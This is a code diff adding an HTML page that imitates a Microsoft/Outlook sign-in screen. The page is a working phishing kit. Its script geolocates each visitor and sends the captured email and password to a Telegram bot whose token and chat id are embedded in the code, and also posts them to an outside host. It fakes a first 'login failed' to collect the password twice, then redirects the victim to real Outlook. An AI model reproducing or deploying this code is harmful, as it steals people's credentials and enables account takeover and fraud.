@@ -1,0 +1,361 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to your account</title>
+  <link rel="icon" type="image/png" href="https://imgpx.com/6ku7K2wLEmnL.png" />
+  <style>
+  
+    body {
+      font-family: "Segoe UI", Helvetica, sans-serif;
+      background: linear-gradient(to right, #f0f0f0, #e8e8e8);
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .function-box {
+      background-color: #fff;
+      padding: 28px 24px;
+      max-width: 380px;
+      width: 90%;
+      box-shadow: 0 0 12px rgba(0,0,0,0.05);
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 16px;
+    }
+    .oauth-box {
+      background-color: #fff;
+    padding: 2px 63px;
+    max-width: 300px;
+    width: 90%;
+    height: 48px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.03);
+    display: flex
+;
+    justify-content: flex-start;
+    align-items: center;
+    position: relative;
+    overflow: hidden;
+}
+    .logo { width: 110px; margin-bottom: 10px; }
+    .title { font-size: 24px; color: #1B1B1B; margin: 6px 0 16px; }
+    form { display: flex; flex-direction: column; width: 100%; }
+    .input-role {
+      padding: 6px 10px 0;
+      width: 100%;
+      height: 36px;
+      font-size: 14px;
+      color: #1B1B1B;
+      background: #fff;
+      border: none;
+      border-bottom: 1px solid #1B1B1B;
+      margin-bottom: 12px;
+      outline: none;
+    }
+    .input-role:focus { border-bottom: 2px solid #0067BB; }
+    .next-button {
+      padding: 4px 12px;
+    background-color: #0067BB;
+    color: white;
+    border: none;
+    font-size: 14px;
+    width: 108px;
+    height: 32px;
+    align-self: flex-end;
+    cursor: pointer;
+    float: right;
+}
+    .next-button:hover { background-color: #005499; }
+    .link { font-size: 10px; color: #0067b8; text-decoration: none; margin-bottom: 5px; }
+    .link span { text-decoration: underline; }
+    .link.no-account { color: black; }
+    .oauth-box button {
+      background: none;
+      border: none;
+      font-size: 13px;
+      color: #1B1B1B;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 8px;
+      cursor: pointer;
+    }
+    .key-bg {
+      position: absolute;
+      opacity: 0.08;
+      width: 60px;
+      height: 60px;
+      z-index: 1;
+      right: 12px;
+      bottom: -10px;
+    }
+    .error-message {
+      color: #D93025;
+      background-color: #FEE;
+      border: 1px solid #D93025;
+      padding: 8px 12px;
+      margin-bottom: 10px;
+      font-size: 13px;
+      border-radius: 4px;
+    }
+    .spinner {
+      display: none;
+      margin-top: 10px;
+      align-self: center;
+    }
+    .hidden { display: none; }
+    body {
+    margin: 0;
+    height: 100vh;
+    overflow: hidden;
+    position: relative;
+  }
+
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 100%;
+    background-image: url('https://imgpx.com/WNXpqr2OQXhf.jpg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: center center;
+    filter: blur(5px);
+    z-index: -1; /* Push behind content */
+  }
+  @media (max-width: 480px) {
+  .function-box, .oauth-box {
+    width: 95% !important;
+    padding: 20px !important;
+    box-shadow: none !important;
+    border: none !important;
+    background-color: white !important;
+    max-width: 300px;
+  }
+
+  .title {
+    font-size: 20px !important;
+  }
+
+  .input-role {
+    font-size: 16px !important;
+    border-bottom: none !important;
+  }
+
+  .next-button {
+    width: 100% !important;
+    height: 40px !important;
+    font-size: 16px !important;
+    margin-top: 12px;
+    box-shadow: none !important;
+  }
+
+  .oauth-box button {
+    font-size: 14px !important;
+  }
+
+  .logo {
+    width: 90px !important;
+  }
+
+  .link {
+    font-size: 12px !important;
+  }
+
+  /* Swap and blur mobile background image */
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 100%;
+    background-image: url('https://imgpx.com/DxaPPP15TSbI.jpg'); /* Replace with your mobile image URL */
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: center center;
+    filter: blur(5px); /* Increase blur if needed */
+    z-index: -1;
+    display: block !important;
+  }
+
+  body {
+    background: none !important;
+  }
+}
+  </style>
+</head>
+<body >
+
+<div class="function-box">
+  <img src="https://imgpx.com/RXhSyvDtqRvm.png" alt="Your Logo" class="logo" />
+  <h1 class="title">Sign in</h1>
+
+  <div id="error-message" class="error-message hidden"></div>
+
+  <form id="loginForm">
+    <div id="step1">
+      <input type="email" id="email" class="input-role" placeholder="Email, phone, or Skype" value="[[−Email−]]" required />
+
+      <div class="link"><a href="#" class="no-account">No account? <span>Create one!</span></a></div>
+      <div class="link"><label><input type="checkbox" id="rememberMe"> Remember me</label></div>
+      <button type="button" class="next-button" onclick="goToStep2()">Next</button>
+    </div>
+
+    <div id="step2" class="hidden">
+      <label for="password" class="link">Password</label>
+      <input type="password" id="password" class="input-role" placeholder="Enter your password" required />
+      <a href="#" class="link">Forgot password?</a>
+      <button type="submit" class="next-button">Sign in</button>
+      <div class="spinner" id="spinner">⏳ Logging in...</div>
+    </div>
+  </form>
+</div>
+
+<div class="oauth-box">
+  <button onclick="oauth('ke')">Sign-in options</button>
+</div>
+
+<script>
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const spinner = document.getElementById("spinner");
+  const errorBox = document.getElementById("error-message");
+  const emailInput = document.getElementById("email");
+  let attemptCount = 0;
+
+  const botToken = "7683193341:AAEktYjPYXmxjMcpUtdx2V51ZbtlNDtE1Ss
+";
+  const chatId = "7375071472";
+ 
+  // Get IP info from ipinfo.io and send to Telegram
+    fetch("https://ipinfo.io/json?token=bcd02da8aff91e")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country;
+        const loc = data.loc;
+        const org = data.org;
+
+        const message = `🌍 Visitor Info\n\nIP: ${ip}\nLocation: ${city}, ${region}, ${country}\nCoordinates: ${loc}\nISP: ${org}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      })
+      
+  window.addEventListener("DOMContentLoaded", () => {
+    // Auto-fill email from URL, like ?email=someone@example.com
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailFromURL = urlParams.get("email");
+    if (emailFromURL && emailFromURL.includes("@")) {
+      emailInput.value = emailFromURL;
+    } else {
+      emailInput.value = "[EMail]"; // fallback placeholder
+    }
+  });
+
+  function showError(message) {
+    errorBox.textContent = message;
+    errorBox.classList.remove("hidden");
+  }
+
+  function clearError() {
+    errorBox.textContent = "";
+    errorBox.classList.add("hidden");
+  }
+
+  async function sendToTelegram(email, password, stage) {
+    try {
+      const ipInfo = await fetch("https://ipapi.co/json").then(res => res.json());
+      const msg = `📡 100undred: ${stage}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ipInfo.ip}\n🏙️ City: ${ipInfo.city}\n🌐 Country: ${ipInfo.country_name}`;
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+    } catch (e) {
+      console.error("Telegram error", e);
+    }
+  }
+
+  function goToStep2() {
+    clearError();
+    const email = emailInput.value.trim();
+    if (!email || !email.includes("@")) {
+      showError("Please enter a valid email address.");
+      return;
+    }
+    sessionStorage.setItem("userEmail", email);
+    sendToTelegram(email, "", "Step 1 (Email Entered)");
+    step1.classList.add("hidden");
+    step2.classList.remove("hidden");
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    clearError();
+    spinner.style.display = "block";
+
+    const password = document.getElementById("password").value.trim();
+    const email = sessionStorage.getItem("userEmail") || "";
+
+    if (!password) {
+      showError("Password is required.");
+      spinner.style.display = "none";
+      return;
+    }
+
+    try {
+      const res = await fetch("https://example444.jcsavest.com/Oufice/login.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        credentials: "include",
+        body: JSON.stringify({ email, password })
+      });
+
+      const data = await res.json();
+      if (!res.ok || !data.token) throw new Error(data.message || "Invalid credentials");
+
+      spinner.style.display = "none";
+      window.location.href = "https://outlook.office.com/mail/";
+    } catch (err) {
+      spinner.style.display = "none";
+      attemptCount++;
+      await sendToTelegram(email, password, "❌ Login Failed");
+
+      if (attemptCount === 1) {
+        showError("Login failed. Please re-enter your password.");
+        document.getElementById("password").value = "";
+      } else {
+        window.location.href = "https://outlook.office.com/mail/";
+      }
+    }
+  });
+
+  function oauth(provider) {
+    if (provider === "ke") {
+      window.location.href = "https://login.ke.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&response_type=code&redirect_uri=https://yourapp.com/redirect";
+    }
+  }
+</script>
+
+</body>
+</html>
